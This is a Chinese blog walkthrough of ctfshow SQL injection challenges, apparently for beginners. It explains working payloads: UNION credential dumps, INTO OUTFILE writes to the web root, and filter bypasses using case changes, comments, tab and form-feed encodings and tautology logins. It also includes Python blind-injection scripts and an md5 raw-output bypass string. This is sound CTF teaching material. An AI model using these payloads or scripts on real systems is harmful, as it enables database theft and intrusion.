<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>适合小白ctfshow-web入门—sql注入175-248超详细解析！！ - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="适合小白ctfshow-web入门—sql注入175-248超详细解析！！" />
<meta property="og:description" content="web 175 将数据输出到一个文件中，然后访问对应文件
-1&#39; union select username,password from ctfshow_user5 into outfile &#34;/var/www/html/1.txt&#34;--&#43; 1）union select username, password from ctfshow_user5: 这是一个UNION查询，它将原始查询的结果与从表 ctfshow_user5 中选择的用户名和密码进行合并。
2）into outfile &#34;/var/www/html/1.txt&#34;: 这部分似乎是将查询结果导出到文件。路径 /var/www/html/1.txt 表示要将查询结果写入到位于网页根目录下的名为 1.txt 的文件中。
（路径 /var/www/html/ 是一个常见的用于存放网页文件的目录，通常被称为网页根目录。在许多Web服务器中，这个目录被设置为存放网站的主要文件，因此可以通过浏览器访问。）
web176 过滤了select，通过大小写即可绕过 1&#39;union sElect 1,2,group_concat(password) from ctfshow_user--&#43;
解法二 万能密码：
1&#39; or 1=1--&#43; web 177——/**/绕过空格 解法一：万能密码 1&#39;or/**/1=1%23
解法二：正常查询 1&#39;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#39;flag&#39;%23
%23: 这是URL编码中表示字符 # 的方式。在SQL查询中，%23 后的内容将被视为注释，从而忽略后续的内容。这种写法可能是为了防止后续内容被执行。 web 178 解法一 过滤了空格与*号等用%09绕过
1&#39;%09union%09select%091,2,3%23
之后一把梭得到flag 1&#39;%09union%09select%091,2,password%09from%09ctfshow_user%23
%09 是URL编码中表示水平制表符（Tab键）的方式。URL编码是一种将特殊字符转换为URL安全格式的方法，以便在URL中传输这些字符而不会造成歧义或错误。
%09 被用来表示水平制表符。在SQL注入攻击中，攻击者有时会使用各种编码方式来试图绕过输入过滤或检测，从而执行恶意操作。在这个特定的查询中，使用 %09 作为空格的替代，可能是为了试图混淆代码，使得检测和防御机制更难识别和阻止注入攻击。
解法二 id=1&#39;or&#39;1&#39;=&#39;1&#39;%23 web179 解法一 一句话梭哈" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/6d6f40c865489ae5055ef749f2b18a42/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-12T16:24:59+08:00" />
<meta property="article:modified_time" content="2023-09-12T16:24:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">适合小白ctfshow-web入门—sql注入175-248超详细解析！！</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3 id="web-175">web 175</h3> 
<p>将数据输出到一个文件中，然后访问对应文件</p> 
<pre><code>-1' union select  username,password from ctfshow_user5 into outfile "/var/www/html/1.txt"--+</code></pre> 
<p><code>1）union select username, password from ctfshow_user5</code>: 这是一个UNION查询，它将原始查询的结果与从表 <code>ctfshow_user5</code> 中选择的用户名和密码进行合并。</p> 
<p><code>2）into outfile "/var/www/html/1.txt"</code>: 这部分似乎是将查询结果导出到文件。路径 <code>/var/www/html/1.txt</code> 表示要将查询结果写入到位于网页根目录下的名为 <code>1.txt</code> 的文件中。</p> 
<p>（路径 <code>/var/www/html/</code> 是一个常见的用于存放网页文件的目录，通常被称为网页根目录。在许多Web服务器中，这个目录被设置为存放网站的主要文件，因此可以通过浏览器访问。）</p> 
<h2>web176</h2> 
<p>过滤了<code>select</code>，通过大小写即可绕过 </p> 
<p> <span style="background-color:#d7d8d9;">1'union sElect 1,2,group_concat(password) from ctfshow_user--+</span></p> 
<h4 id="解法二">解法二</h4> 
<p>万能密码：</p> 
<pre><code>1' or 1=1--+</code></pre> 
<h3 id="web-177绕过空格">web 177——/**/绕过空格</h3> 
<h4 id="解法一万能密码">解法一：万能密码</h4> 
<p><span style="background-color:#d7d8d9;">1'or/**/1=1%23</span></p> 
<h4 id="解法二正常查询">解法二：正常查询</h4> 
<p><span style="background-color:#d7d8d9;">1'/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username='flag'%23</span></p> 
<p><code>%23</code>: 这是URL编码中表示字符 <code>#</code> 的方式。在SQL查询中，<code>%23</code> 后的内容将被视为注释，从而忽略后续的内容。这种写法可能是为了防止后续内容被执行。 </p> 
<h2>web 178</h2> 
<h3><a name="t15"></a><a id="_133"></a>解法一</h3> 
<p>过滤了空格与*号等用<code>%09</code>绕过<br><code><span style="background-color:#d7d8d9;">1'%09union%09select%091,2,3%23</span></code><br> 之后一把梭得到flag <code><span style="background-color:#d7d8d9;">1'%09union%09select%091,2,password%09from%09ctfshow_user%23</span></code></p> 
<p> <code>%09</code> 是URL编码中表示水平制表符（Tab键）的方式。URL编码是一种将特殊字符转换为URL安全格式的方法，以便在URL中传输这些字符而不会造成歧义或错误。</p> 
<p><code>%09</code> 被用来表示水平制表符。在SQL注入攻击中，攻击者有时会使用各种编码方式来试图绕过输入过滤或检测，从而执行恶意操作。在这个特定的查询中，使用 <code>%09</code> 作为空格的替代，可能是为了试图混淆代码，使得检测和防御机制更难识别和阻止注入攻击。</p> 
<h3>解法二</h3> 
<p><code><span style="background-color:#d7d8d9;">id=1'or'1'='1'%23</span></code><span style="background-color:#d7d8d9;"> </span></p> 
<h2>web179</h2> 
<h3><a name="t18"></a><a id="_141"></a>解法一</h3> 
<p>一句话梭哈<br><code><span style="background-color:#d7d8d9;">id=1'or'1'='1'%23</span></code></p> 
<h3><a name="t19"></a><a id="_144"></a>解法二</h3> 
<p>这次还把<code>%09</code>过滤了，测试了下发现<code>%0c</code>可以绕过<br> 所以<code><span style="background-color:#d7d8d9;">1'union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</span></code></p> 
<h3>web 180</h3> 
<p><span style="background-color:#d7d8d9;">1'%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c'flag')%0c--%0c</span></p> 
<p>这段代码中的 <code>(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c'flag')</code> 是一个子查询。子查询是一个嵌套在主查询内部的查询语句，它可以在主查询的结果中嵌入另一个查询以获取更详细或特定的数据。</p> 
<p>在这个特定的查询中，子查询的目的是从表 <code>ctfshow_user</code> 中选择用户名为 <code>'flag'</code> 的记录，并获取其密码信息。</p> 
<p>让我们分解这个子查询的每个部分：</p> 
<ul><li> <p><code>select%0cpassword%0c</code>: 这部分指定了要从表中选择的列，即 <code>password</code> 列。</p> </li><li> <p><code>from%0cctfshow_user</code>: 这部分指定了数据来源，即从表 <code>ctfshow_user</code> 中选择数据。</p> </li><li> <p><code>where%0cusername%0c=%0c'flag'</code>: 这部分是一个条件，它限制了只选择用户名为 <code>'flag'</code> 的记录。</p> </li></ul> 
<p>整个子查询的目的是在主查询中获取 <code>ctfshow_user</code> 表中用户名为 <code>'flag'</code> 的记录的密码。</p> 
<p>将子查询放在 <code>( ... )</code> 内部是因为它可以被视为一个单独的数据项，就像在整个主查询中选择的其他列一样。这使得子查询的结果能够嵌套在主查询的结果中。</p> 
<h3>web181</h3> 
<p>空格过滤了很多，select也被过滤了。</p> 
<p>题目的where语句处是and连接两个条件。可以考虑<a href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7&amp;spm=1001.2101.3001.7020" title="运算符优先级">运算符优先级</a></p> 
<table><thead><tr><th>优先级</th><th>运算符</th></tr></thead><tbody><tr><td>1</td><td>:=</td></tr><tr><td>2</td><td>|| , OR , XOR</td></tr><tr><td>3</td><td>&amp;&amp; , AND</td></tr></tbody></table> 
<p>and的优先级高于or，需要同时满足两边的条件才会返回true，那么后面可以接一个or，or的两边有一个为true，既可以满足and。即：1 and 0 or 1</p> 
<p>可以让where直接查找flag，最后的<a href="https://so.csdn.net/so/search?q=payload&amp;spm=1001.2101.3001.7020" title="payload">payload</a>为：<code>-1'||username='flag</code></p> 
<p>这道题<code>%0c</code>也可以：<code>-1'%0cor%0cusername='flag</code></p> 
<p>web182</p> 
<p><strong>解答</strong>：增加了flag过滤。like可以模糊匹配 </p> 
<p></p> 
<p><code>%0c</code>在本题依旧可用。<br><strong>payload</strong>：<code>-1'||(username)like'%fla%</code></p> 
<p>like可以用两个通配符（不区分大小写）：</p> 
<table><thead><tr><th>字符</th><th>说明</th></tr></thead><tbody><tr><td><code>%</code></td><td>匹配任何数目的字符，甚至包括零字符</td></tr><tr><td><code>_</code></td><td>只能匹配一种字符，例如，字符串“ab_”匹配以字符串“ab”开始长度为3的字符串</td></tr></tbody></table> 
<h3>web183</h3> 
<pre><code class="language-python">import requests
import string

url = 'http://ec30edd1-31ee-45ae-9db4-7db5f4b6c83d.challenge.ctf.show/select-waf.php'
uuid = string.digits+string.ascii_lowercase+"-}"
passwd = "`ctfshow_user`where(pass)like'ctfshow{"

for i in range(40):
    for char in uuid:
        data = {
            'tableName' : passwd +f"{char}%'"
        }
        res = requests.post(url, data=data)
        if "$user_count = 1;" in res.text:
            passwd += char
            print(passwd)
            break
</code></pre> 
<ul><li><code>string.digits</code> 包含了所有数字字符（0到9）。</li><li><code>string.ascii_lowercase</code> 包含了所有小写字母字符（a到z）。</li></ul> 
<p></p> 
<h3>web184</h3> 
<p>过滤的有点多，where、单双引号、反引号都被过滤了，但是本题没有过滤空格。<br> where可以用having代替，单双引号可以用 括号+十六进制。</p> 
<p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</p> 
<p><strong>十六进制</strong>：可以前面加x，后面用引号包裹或者0x；也可以和算数运算结合表示数字。</p> 
<p>用pycharm将ctfshow{%这个utf-8编码转换为十六进制字符串，最终得到<img alt="" height="1021" src="https://images2.imgbox.com/58/8f/ob01UUVZ_o.png" width="1200"> ctfshow_user group by pass having pass like 0x63746673686f777b25<img alt="" height="428" src="https://images2.imgbox.com/38/34/ey1VbA2B_o.png" width="698"></p> 
<pre><code class="language-python">import requests
import string

url = 'http://e62dd2da-6dc5-4d4c-8907-ab198e411f30.challenge.ctf.show/select-waf.php'
uuid = string.digits+string.ascii_lowercase+"-}"
passwd = 'ctfshow_user group by pass having pass regexp(0x63746673686f777b' #ctfshow{

for i in range(40):
    for char in uuid:
        data = {
            'tableName' : passwd +f"{hex(ord(char))[2:]})"
        }
        res = requests.post(url, data=data)
        if "$user_count = 1;" in res.text:
            passwd += hex(ord(char))[2:]
            print(passwd)
            break
</code></pre> 
<p></p> 
<h3>web185(过滤数字)   </h3> 
<table border="1" cellpadding="1" cellspacing="1" style="width:500px;"><tbody><tr><th>expression</th><th>值</th></tr><tr><td>false</td><td>0</td></tr><tr><td>true</td><td>1</td></tr><tr><td>true+true</td><td>2</td></tr><tr><td>floor(pi())</td><td>3</td></tr><tr><td>ceil(pi())</td><td>4</td></tr><tr><td>floor(pi())+true</td><td>5</td></tr><tr><td>floor(pi())+floor(pi())</td><td>6</td></tr><tr><td>floor(pi())+ceil(pi())</td><td>7</td></tr><tr><td>ceil(pi())+ceil(pi())</td><td>8</td></tr><tr><td>floor(pi())*floor(pi())</td><td>9</td></tr><tr><td>floor(pi())*floor(pi())+true</td><td>10</td></tr></tbody></table> 
<p>web185</p> 
<pre><code class="language-python">import requests

url = 'http://a4665c0e-90e4-4d21-b12f-9885d1508bca.challenge.ctf.show/select-waf.php'
strlist = '{0123456789-abcdef}'
flagstr = ''
flag = ''
strdict = {'0':'false,','1':'true,','2':'(true+true),',
           '3':'(true+true+true),','4':'(true+true+true+true),',
           '5':'(true+true+true+true+true),','6':'(true+true+true+true+true+true),',
           '7':'(power((true+true),(true+true+true))-true),',
           '8':'(power((true+true),(true+true+true))),',
           '9':'(power((true+true),(true+true+true))+true),'
           }

for j in range(666): #不知道 flag 长度，尽量长一点（实际有38位，从{算起，到}结束）
    for i in strlist:
        m = ''
        #将每个字符转成 Unicode编码对应的十进制（Unicode编码为ASCII码扩展）
        #对其十进制进行拆分转换，这样可以降低一点时间复杂度
        for x in str(ord(i)):
            m += strdict[x]
        m = 'char(concat('+m[:-1]+')),'

        data = {
            'tableName': "ctfshow_user group by pass having pass regexp(concat({}))".format(flagstr+m[:-1])
        }

        respond = requests.post(url, data=data)  # 获取页面代码
        respond = respond.text  # 解析成字符串类型
        if 'user_count = 1' in respond:
            print('--------------------正确',i)
            flagstr += m
            flag += i
            print('ctfshow'+flag)
            break
        else:print('==================='+i+'错误')
    if flag[-1] == '}':exit()   #判断 flag 是否获取完整</code></pre> 
<p>web187</p> 
<p>看到<code>md5($password,true)</code>,立马想到可以用万能密码绕过</p> 
<pre><code>ffifdyop
129581926211651571912466741651878684928
</code></pre> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/43791500e49b6895306add2f3840699d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">AI项目六：基于YOLOV5的CPU版本部署openvino</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/32abb7495034deda52d4dd9b73c96eca/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">MySQL 在线模式迁移工具gh-ost用法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>